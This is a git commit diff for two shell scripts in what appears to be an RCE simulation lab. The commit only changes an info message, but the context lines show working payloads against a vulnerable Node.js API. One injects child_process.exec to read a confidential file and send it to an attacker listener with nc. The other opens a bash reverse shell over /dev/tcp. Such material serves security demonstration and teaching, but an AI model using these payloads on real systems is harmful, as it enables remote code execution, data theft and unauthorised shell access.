ae8d1a986cf67b49ba6a53b92797ae3acc32cbfb
Lutfa Ibtihaji Ilham <lutfailham96@gmail.com>
2023-06-04 23:42:59 +0700

    Add simulation info

--- scripts/execute-rce-confidential-file.sh
+++ scripts/execute-rce-confidential-file.sh
@@ -13,7 +13,10 @@ ATTACKER_PORT="9090"
 
 CONFIDENTIAL_FILE="/usr/src/app/confidential.txt"
 
-echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
+# this just for simulation info
+echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}http://172.17.0.2:9000/vulnerable-api${RESET} )"
+
+#echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
 echo -e "${CYAN}info${RESET}: sending payload ...\n"
 
 curl "${BASE_URL}/?q=require(%27child_process%27).exec(%27cat+${CONFIDENTIAL_FILE}+|+nc+${ATTACKER_IP}+${ATTACKER_PORT}%27)"
--- scripts/execute-rce-session.sh
+++ scripts/execute-rce-session.sh
@@ -5,7 +5,10 @@ BASE_URL="http://127.0.0.1:9000/vulnerable-api"
 ATTACKER_IP="172.17.0.1"
 ATTACKER_PORT="9090"
 
-echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
+# this just for simulation info
+echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}http://172.17.0.2:9000/vulnerable-api${RESET} )"
+
+#echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
 echo -e "${CYAN}info${RESET}: sending payload ...\n"
 
 curl "${BASE_URL}/?q=require(%27child_process%27).exec(%27bash+-c+%22bash+-i+%3E%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0%3E%261%22%27)"
